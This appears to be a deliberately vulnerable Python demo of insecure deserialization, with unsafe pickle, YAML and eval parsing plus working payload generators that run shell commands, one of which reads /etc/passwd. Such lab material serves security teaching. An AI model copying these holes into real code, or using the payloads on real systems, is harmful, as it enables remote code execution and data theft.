#!/usr/bin/env python3
"""
Vulnerable Program: Insecure Deserialization
CVE Pattern: CWE-502 (Deserialization of Untrusted Data)
Similar to: CVE-2017-5941 (Node.js), CVE-2019-6340 (Drupal)

Vulnerability: Deserializing user-controlled data can lead to
arbitrary code execution via crafted payloads.
"""

import pickle
import base64
import yaml
import sys
import os

# ============================================
# VULNERABLE: Python pickle deserialization
# ============================================

class MaliciousPickle:
    """Example of malicious pickle payload generator"""
    def __reduce__(self):
        import os
        return (os.system, ("id; whoami; echo 'PWNED!'",))


def deserialize_pickle_vulnerable(data):
    """
    VULNERABLE: Deserialize untrusted pickle data
    
    Exploit: Create malicious pickle that executes code on load
    
    import pickle, base64, os
    class Exploit:
        def __reduce__(self):
            return (os.system, ("id",))
    payload = base64.b64encode(pickle.dumps(Exploit()))
    """
    try:
        # VULNERABLE: Deserializing untrusted pickle data
        decoded = base64.b64decode(data)
        obj = pickle.loads(decoded)  # DANGEROUS!
        print(f"[+] Deserialized object: {obj}")
        return obj
    except Exception as e:
        print(f"[-] Deserialization failed: {e}")
        return None


def save_user_session_vulnerable(session_data):
    """
    VULNERABLE: Save session using pickle
    """
    # VULNERABLE: Using pickle for untrusted data
    pickled = pickle.dumps(session_data)
    encoded = base64.b64encode(pickled).decode()
    return encoded


def load_user_session_vulnerable(encoded_session):
    """
    VULNERABLE: Load session from untrusted cookie/input
    """
    try:
        decoded = base64.b64decode(encoded_session)
        # VULNERABLE: Unpickling user-controlled data
        session = pickle.loads(decoded)
        return session
    except Exception as e:
        print(f"[-] Session load failed: {e}")
        return None


# ============================================
# VULNERABLE: YAML deserialization
# ============================================

def parse_yaml_vulnerable(yaml_string):
    """
    VULNERABLE: Parse YAML with unsafe loader
    
    Exploit payload:
    !!python/object/apply:os.system ["id"]
    
    Or:
    !!python/object/new:subprocess.check_output [["id"]]
    """
    try:
        # VULNERABLE: yaml.load without safe_loader
        # PyYAML < 5.1 allows arbitrary Python object instantiation
        data = yaml.load(yaml_string, Loader=yaml.Loader)  # DANGEROUS!
        print(f"[+] Parsed YAML: {data}")
        return data
    except Exception as e:
        print(f"[-] YAML parse failed: {e}")
        return None


def load_config_vulnerable(config_file):
    """
    VULNERABLE: Load config file with unsafe YAML
    """
    try:
        with open(config_file, 'r') as f:
            # VULNERABLE: Full YAML loader
            config = yaml.load(f, Loader=yaml.FullLoader)
        return config
    except Exception as e:
        print(f"[-] Config load failed: {e}")
        return None


# ============================================
# VULNERABLE: eval-based JSON alternative
# ============================================

def parse_json_vulnerable(json_string):
    """
    VULNERABLE: Using eval to parse JSON-like data
    
    Exploit: "__import__('os').system('id')"
    """
    try:
        # VULNERABLE: eval() on user input
        data = eval(json_string)  # DANGEROUS!
        print(f"[+] Parsed data: {data}")
        return data
    except Exception as e:
        print(f"[-] Parse failed: {e}")
        return None


# ============================================
# Exploit payload generators
# ============================================

def generate_pickle_exploit(command="id"):
    """Generate malicious pickle payload"""
    
    class Exploit:
        def __init__(self, cmd):
            self.cmd = cmd
        def __reduce__(self):
            return (os.system, (self.cmd,))
    
    payload = pickle.dumps(Exploit(command))
    encoded = base64.b64encode(payload).decode()
    return encoded


def generate_yaml_exploit(command="id"):
    """Generate malicious YAML payload"""
    # Various YAML exploitation payloads
    payloads = [
        f'!!python/object/apply:os.system ["{command}"]',
        f'!!python/object/new:subprocess.check_output [["{command}"]]',
        f"""!!python/object/apply:subprocess.Popen
  - {command}
  - shell: true""",
    ]
    return payloads[0]


def main():
    print("=" * 50)
    print("Insecure Deserialization Demo")
    print("=" * 50)
    
    if len(sys.argv) < 2:
        print(f"\nUsage: {sys.argv[0]} <action> [args]")
        print("\nActions:")
        print("  pickle <base64_data>   - Deserialize pickle (DANGEROUS)")
        print("  yaml <yaml_string>     - Parse YAML (DANGEROUS)")
        print("  eval <expression>      - Eval JSON-like data (DANGEROUS)")
        print("  generate <command>     - Generate exploit payloads")
        print("\nExploit Examples:")
        print(f"  # Generate pickle exploit")
        print(f"  {sys.argv[0]} generate 'id; cat /etc/passwd'")
        print(f"  ")
        print(f"  # Execute pickle exploit")
        print(f"  {sys.argv[0]} pickle <base64_payload>")
        print(f"  ")
        print(f"  # YAML exploit")
        print(f"  {sys.argv[0]} yaml '!!python/object/apply:os.system [\"id\"]'")
        return
    
    action = sys.argv[1]
    
    if action == "pickle" and len(sys.argv) >= 3:
        deserialize_pickle_vulnerable(sys.argv[2])
        
    elif action == "yaml" and len(sys.argv) >= 3:
        parse_yaml_vulnerable(sys.argv[2])
        
    elif action == "eval" and len(sys.argv) >= 3:
        parse_json_vulnerable(sys.argv[2])
        
    elif action == "generate":
        cmd = sys.argv[2] if len(sys.argv) >= 3 else "id"
        
        print("\n[*] Generated Pickle Exploit (base64):")
        pickle_payload = generate_pickle_exploit(cmd)
        print(f"    {pickle_payload}")
        
        print("\n[*] Generated YAML Exploit:")
        yaml_payload = generate_yaml_exploit(cmd)
        print(f"    {yaml_payload}")
        
        print("\n[*] Eval Exploit:")
        print(f"    __import__('os').system('{cmd}')")
        
        print(f"\n[*] To test pickle exploit:")
        print(f"    {sys.argv[0]} pickle '{pickle_payload}'")
        
    else:
        print("Invalid action")


if __name__ == "__main__":
    main()

